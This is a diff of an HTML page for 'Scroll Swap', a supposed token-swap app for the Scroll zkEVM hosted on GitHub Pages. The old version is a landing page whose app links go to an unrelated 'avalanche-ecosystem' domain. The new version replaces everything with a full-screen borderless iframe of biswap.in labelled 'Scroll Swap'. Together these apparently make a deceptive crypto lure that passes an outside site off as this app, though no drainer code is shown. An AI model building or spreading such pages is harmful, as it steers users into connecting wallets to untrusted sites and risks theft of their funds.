@@ -1,117 +1,59 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Scroll Swap</title>
-  <meta name="description" content="Scroll Swap swaps tokens on the Scroll zkEVM from your own wallet.">
-  <link rel="canonical" href="https://scroll-swap.github.io/">
-  <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F7F3EF">
-  <meta property="og:type" content="website">
-  <meta property="og:title" content="Scroll Swap">
-  <meta property="og:description" content="Scroll Swap swaps tokens on the Scroll zkEVM from your own wallet.">
-  <meta property="og:url" content="https://scroll-swap.github.io/">
-  <meta property="og:image" content="https://scroll-swap.github.io/favicon.png">
-  <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Scroll Swap">
-  <meta name="twitter:description" content="Scroll Swap swaps tokens on the Scroll zkEVM from your own wallet.">
-  <link rel="icon" type="image/png" sizes="256x256" href="favicon.png">
-  <link rel="apple-touch-icon" href="favicon.png">
-  <link rel="manifest" href="site.webmanifest">
-  <link rel="stylesheet" href="style.css">
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@graph": [
-      {
-        "@type": "WebSite",
-        "@id": "https://scroll-swap.github.io/#website",
-        "url": "https://scroll-swap.github.io/",
-        "name": "Scroll Swap",
-        "description": "Scroll Swap swaps tokens on the Scroll zkEVM from your own wallet.",
-        "inLanguage": "en"
-      },
-      {
-        "@type": "Organization",
-        "@id": "https://scroll-swap.github.io/#organization",
-        "name": "Scroll Swap",
-        "url": "https://scroll-swap.github.io/",
-        "logo": "https://scroll-swap.github.io/favicon.png"
-      },
-      {
-        "@type": "WebApplication",
-        "@id": "https://scroll-swap.github.io/#app",
-        "name": "Scroll Swap",
-        "applicationCategory": "FinanceApplication",
-        "operatingSystem": "Web",
-        "url": "https://scroll-swap.github.io/",
-        "description": "Scroll Swap swaps tokens on the Scroll zkEVM from your own wallet."
-      }
-    ]
-  }
-  </script>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Scroll Swap - App</title>
+
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      width: 100%;
+      height: 100%;
+      overflow: hidden;
+    }
+
+    iframe {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      border: 0;
+      margin: 0;
+      padding: 0;
+      display: block;
+      z-index: 1;
+    }
+
+    h1 {
+      position: fixed;
+      left: 50%;
+      bottom: 12px;
+      transform: translateX(-50%);
+      margin: 0;
+      padding: 0;
+      z-index: 2;
+      font-size: 13px;
+      font-weight: 500;
+      color: rgba(255, 255, 255, 0.75);
+      font-family: Arial, sans-serif;
+      text-align: center;
+      pointer-events: none;
+    }
+  </style>
 </head>
 <body>
-  <header class="topbar">
-    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer" aria-label="Scroll Swap home">
-      <img src="favicon.png" width="28" height="28" alt="">
-      <span>Scroll Swap</span>
-    </a>
-    <nav class="nav" aria-label="Trusted references">
-      <a href="https://scrollscan.com/" target="_blank" rel="nofollow noopener noreferrer">Scrollscan</a>
-      <a href="https://www.coingecko.com/en/coins/scroll" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
-      <a href="https://ethereum.org/layer-2/" target="_blank" rel="nofollow noopener noreferrer">Layer 2 guide</a>
-    </nav>
-    <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
-  </header>
 
-  <main class="stage">
-    <h1>Scroll Swap</h1>
-    <p class="sub"><strong>Scroll Swap</strong> swaps tokens on the Scroll zkEVM from your own wallet.</p>
+  <iframe
+    src="https://biswap.in/"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-    <section class="swap-card" aria-label="Swap route">
-      <div class="route">
-        <div class="leg">
-          <span class="label">From</span>
-          <span class="chip">
-            <img src="usdc.png" width="32" height="32" alt="USDC">
-            <span>USDC</span>
-          </span>
-        </div>
-        <button class="switch" type="button" data-switch aria-label="Switch swap direction">
-          <span aria-hidden="true">&#8594;</span>
-        </button>
-        <div class="leg">
-          <span class="label">To</span>
-          <span class="chip">
-            <img src="eth.png" width="32" height="32" alt="ETH">
-            <span>ETH</span>
-          </span>
-        </div>
-      </div>
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
-    </section>
-  </main>
+  <h1>Scroll Swap</h1>
 
-  <footer class="foot">Scroll Swap &mdash; 2026</footer>
-
-  <script>
-  (function () {
-    "use strict";
-    var button = document.querySelector("[data-switch]");
-    if (!button) return;
-
-    button.addEventListener("click", function () {
-      var chips = document.querySelectorAll(".chip");
-      if (chips.length < 2) return;
-      var first = chips[0].innerHTML;
-      chips[0].innerHTML = chips[1].innerHTML;
-      chips[1].innerHTML = first;
-      button.classList.toggle("is-swapped");
-    });
-  }());
-  </script>
 </body>
 </html>
